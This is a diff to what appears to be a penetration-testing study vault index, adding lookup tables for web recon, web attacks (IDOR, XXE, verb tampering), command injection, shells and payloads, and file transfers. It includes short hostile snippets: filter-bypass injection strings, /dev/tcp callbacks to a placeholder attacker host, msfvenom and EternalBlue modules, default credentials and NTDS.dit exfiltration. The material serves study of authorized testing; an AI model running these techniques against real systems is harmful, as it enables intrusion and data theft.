@@ -31,6 +31,24 @@
 - **Internal, on the network, nothing else** → `ad-enum-attacks/05-initial-domain-enum.md` + `ad-enum-attacks/06-llmnr-nbtns-poisoning-linux.md`
 - **Need to interact with random services** → `common-services/01-interacting-with-services.md`
 
+## 1b. Web Reconnaissance — external footprint (only a domain/IP)
+
+**Entry point:** `web-recon/00-METHODOLOGY.md` — 7-phase flow (passive → active DNS → vhost → fingerprint → crawl → automate → hand-off) + Decision Tree + Signal→Counter-Move.
+
+| Symptom / State | Try This |
+|---|---|
+| Only have a domain name, nothing else | `web-recon/00-METHODOLOGY.md` Phase 1 → `whois \| grep IANA`, `dig NS/MX/TXT`, crt.sh JSON, dorks, Wayback |
+| Need subdomains, must stay stealth | Phase 1 → crt.sh JSON API + `site:` dorks + Wayback (zero packets to target) |
+| Have domain + its NS records | Phase 2.A → `dig axfr @<each NS> <DOMAIN>` (one query = whole zone; try EVERY NS) |
+| Zone transfer denied on all NS | Phase 2.B → `dnsenum -f subdomains-top1million-20000.txt` (escalate to 110k) |
+| Subdomain in CT/DNS but page not reachable, or suspect hidden sites on one IP | Phase 3 → vhost fuzz (`gobuster vhost --append-domain`); `/etc/hosts` first |
+| Found a vhost, no further progress | Phase 3 gotcha → re-run vhost brute *against the new vhost* (nested vhosts) + pull its `/robots.txt` |
+| Need to know server/CMS/WAF before attacking | Phase 4 → `wafw00f` FIRST, then `curl -I`, `<meta generator>`, `nikto -Tuning b` |
+| Web app reachable, want hidden paths/intel | Phase 5 → `/robots.txt`, `/sitemap.xml`, `/.well-known/*`, ReconSpider → `jq '.comments'` |
+| Many targets / time-boxed recon | Phase 6 → `finalrecon.py --headers --whois --sub --dns --crawl` |
+| Everything resolves / every vhost "Found" | Signal→Counter — wildcard DNS/vhost; validate via HTTP fetch, filter `-fs`/`--exclude-length` |
+| Recon done — where next | Phase 7 → vhosts→ffuf, stack→web-attacks/common-apps, internal IPs→pivoting, leaked keys→password-attacks |
+
 ## 2. Port → service → notes
 
 | Port | Service | Primary note(s) |
@@ -66,6 +84,25 @@
 | SQLi behind WAF / CSRF token | `sqlmap-fundamentals/09-bypassing-protections.md` |
 | Need to fuzz hidden params/dirs | `file-inclusion/09-automated-scanning.md`, `web-proxies/10-burp-intruder.md`, `web-proxies/11-zap-fuzzer.md` |
 | Need to manipulate raw request | `web-proxies/04-intercepting-requests.md`, `07-repeating-requests.md`, `08-encoding-decoding.md` |
+| `401`/`403`/"Access Denied" on a dir or action, but app works some ways | `web-attacks/00-METHODOLOGY.md` Phase 1.A (verb tampering — `OPTIONS` then replay with `HEAD`) |
+| Input filter blocks payload (`Malicious Request Denied!`) but accepts benign | `web-attacks/00-METHODOLOGY.md` Phase 1.B (GET→POST, `$_GET` vs `$_REQUEST`) |
+| POST reset/action returns "Access Denied" despite valid data | `web-attacks/00-METHODOLOGY.md` Phase 1.B/4 (verb-tamper to GET, session-vs-uid check) |
+| Changeable object ref `?uid=`/`?file_id=`/`?id=` shows others' data | `web-attacks/00-METHODOLOGY.md` Phase 2 (IDOR — increment → mass-enumerate) |
+| Object ref is base64 (`ZmlsZV8x…`) or 32-hex MD5 | `web-attacks/00-METHODOLOGY.md` Phase 2.B (`09-bypassing-encoded-references.md` — view-source JS, replicate) |
+| REST API path `/api.php/profile/1` — guarded writes, open GET | `web-attacks/00-METHODOLOGY.md` Phase 2.C → 4 (`10-idor-insecure-apis.md`, leak uuid → PUT takeover) |
+| Need every user's file/doc at once | `web-attacks/00-METHODOLOGY.md` Phase 2.E (`08-mass-idor-enumeration.md` bash loop) |
+| App parses XML / SOAP / SVG / DOCX, element reflected | `web-attacks/00-METHODOLOGY.md` Phase 3.A→3.B (XXE: internal entity → `file://` → `php://filter`) |
+| XXE works but file has `<`/`>`/`&` chars / no reflection | `web-attacks/00-METHODOLOGY.md` Phase 3.C/3.D (CDATA or error-based external DTD) |
+| Fully blind XXE (no reflection, no errors) | `web-attacks/00-METHODOLOGY.md` Phase 3.E (OOB exfil — `php -S`, XXEinjector) |
+| Several low-impact web bugs, need real impact | `web-attacks/00-METHODOLOGY.md` Phase 4 (chain: enumerate→leak→escalate→exploit) |
+| App "checks" a host/IP/domain (ping, nslookup, whois) | `command-injetions/00-METHODOLOGY.md` Phase 1–2 (`; whoami` / `%0a whoami`, diff baseline) |
+| File manager Move/Copy/Convert, or "export PDF"/thumbnail | `command-injetions/00-METHODOLOGY.md` Phase 1 (shells out to `mv`/`cp`/`convert`) → force op to FAIL for output |
+| Payload blocked client-side ("match the requested format"), no HTTP request sent | `command-injetions/00-METHODOLOGY.md` Phase 2 (front-end only — replay via Burp Repeater + `Ctrl+U`) |
+| Cmd injection confirmed but "Invalid input"/"Malicious request denied!" | `command-injetions/00-METHODOLOGY.md` Phase 4 (test ONE operator at a time; app filter vs WAF) |
+| Operator works but space / `/` / command word blocked | `command-injetions/00-METHODOLOGY.md` Phase 5 (`%09`/`${IFS}` → `${PATH:0:1}` → `c'a't`) |
+| Many chars filtered / behind WAF | `command-injetions/00-METHODOLOGY.md` Phase 5.D (base64 whole cmd: `bash<<<$(base64 -d<<<...)`) or Bashfuscator |
+| Injection runs but no output reflected (blind) | `command-injetions/00-METHODOLOGY.md` Phase 6.C (`sleep 5` timing, `curl`/`nslookup` OOB) |
+| Have cmd output → want shell on the box | `command-injetions/00-METHODOLOGY.md` Phase 6.A → `shells-payloads/00-METHODOLOGY.md` |
 
 ### Common Web Applications (Tomcat, Jenkins, Splunk, GitLab, ColdFusion, etc.)
 
@@ -83,6 +120,21 @@
 | WordPress/Joomla/Drupal found | `attacking-common-applications/00-METHODOLOGY.md` Phase 2 → enum users, try brute-force, check known plugin vulns |
 | OSTicket / PRTG / ManageEngine found | `attacking-common-applications/00-METHODOLOGY.md` Phase 2 → try default creds (PRTG: `prtgadmin:prtgadmin`), search CVE database |
 | Got shell on app (Tomcat/Jenkins/Splunk) | `attacking-common-applications/00-METHODOLOGY.md` Phase 5 (post-exploit) → extract config files for db/LDAP creds → pivot |
+
+## 3b. Shells & Payloads — get / stabilise / upgrade a shell
+
+**Entry point:** `shells-payloads/00-METHODOLOGY.md` — 5-phase flow (identify OS → choose direction → deliver payload → catch+verify → upgrade) + Decision Tree + Signal→Counter-Move.
+
+| Symptom / State | Try This |
+|---|---|
+| Have code-exec, need a shell, don't know which type | `shells-payloads/00-METHODOLOGY.md` Phase 2 → reverse by default (egress beats ingress); bind only if no callback path |
+| Fired payload, listener stays silent | Phase 4 / Signal table → AV killed it (Defender silent), wrong LHOST on pivot, or wrong `-f` arch — check listener side first |
+| Need a standalone payload binary (phishing/upload/USB) | Phase 3C → `msfvenom -p ... -f elf\|exe\|war`; staged vs stageless = read `/` vs `_` separators |
+| `sh: no job control` / `sudo -l` empty / no tab-complete | Phase 5A → `python -c 'import pty;pty.spawn("/bin/bash")'`, else perl/ruby/lua/awk/find/vim fallbacks |
+| Web upload worked, want browser RCE | Phase 5B → Laudanum (multi-lang) / Antak (IIS-PS) / WhiteWinterWolf (PHP); then drop reverse shell + delete web shell |
+| `.php` upload rejected by filter | Signal table → Burp: change `Content-Type` to `image/gif` (+ `GIF89a` magic bytes if magic-byte check) |
+| Windows box, ports 139/445, hint "Blue" | Phase 3D → `auxiliary/scanner/smb/smb_ms17_010` → `exploit/windows/smb/ms17_010_psexec` (EternalBlue → SYSTEM) |
+| Pivot: payload from foothold won't call back | Gotcha #2 → LHOST = foothold internal IP (`ip a` on foothold), never Pwnbox external IP |
 
 ## 4. Common Services — Initial Access / Lateral Movement
 
@@ -225,6 +277,20 @@
 | Need to spray known cred across services | `login-brute-forcing/06-hydra.md`, `09-medusa.md` |
 | Need to filter wordlist before attack | `login-brute-forcing/05-hybrid-attacks.md` |
 
+## 7b. File Transfers — get tools in / loot out
+
+**Entry point:** `file-transfers/00-METHODOLOGY.md` — triage by Direction × OS × open protocol + Decision Tree + Signal→Counter-Move. Golden rule: always have a plan B/C/D and verify the hash (raw channels corrupt silently).
+
+| Have / Symptom | Try This |
+|------|------|
+| Need a tool on Windows, PowerShell cradle blocked | `file-transfers/00-METHODOLOGY.md` Phase 6 → `certutil`/`bitsadmin`/`GfxDownloadWrapper`; if also blocked → `cscript wget.vbs` (Phase 4) |
+| Outbound :80/:443 blocked but :445 open | Phase 1.C → `impacket-smbserver -user test -password test` + `net use` |
+| No `curl`/`wget`/`nc` on the Linux box at all | Phase 2.D → `exec 3<>/dev/tcp/<ME>/80` Bash built-in |
+| HTTP/FTP/SMB all blocked, one raw TCP port open | Phase 5.A → nc/ncat (`-q0`/`--send-only`) or `cat < /dev/tcp/<ME>/PORT` |
+| Exfilling NTDS.dit / hashes / sensitive loot | Phase 7 FIRST → `openssl enc -aes256 -pbkdf2 -iter 100000` / `Invoke-AESEncryption.ps1`, then pick a channel |
+| Transferred binary won't run / "not valid Win32" | Signal→Counter — silent truncation (cmd 8191 / raw nc); re-send + `md5sum` ↔ `Get-FileHash` |
+| Already RDP'd in / pivoting AD with WinRM | Phase 5 → `\\tsclient\share` or `New-PSSession` + `Copy-Item -To/-FromSession` |
+
 ## 8. Reporting (when the engagement is "done")
 
 - Methodology overview → `documentation/01-intro-to-documentation-reporting.md`
@@ -236,8 +302,9 @@
 
 ## 9. Gaps in the vault (don't waste time searching here — go to HTB notes)
 
-- `nmap/`, `footprinting/`, `ffuf/`, `web-recon/` — empty
-- `shells-payloads/` — empty (need for revshells, msfvenom, payload formats)
+- `nmap/`, `footprinting/`, `ffuf/` — notes exist, methodology pending
+- `web-recon/` — full methodology + 20 notes (see §1b)
+- `shells-payloads/` — full methodology + 18 notes (see §3b)
 - `linux-privallege-escalation/` — full methodology + 28 notes (see §5c)
 - `password-attacks/` — full methodology + 26 notes (see §7)
 - `ad-enum-attacks/` — sections 26, 28, 30, 33, 34, 35 missing
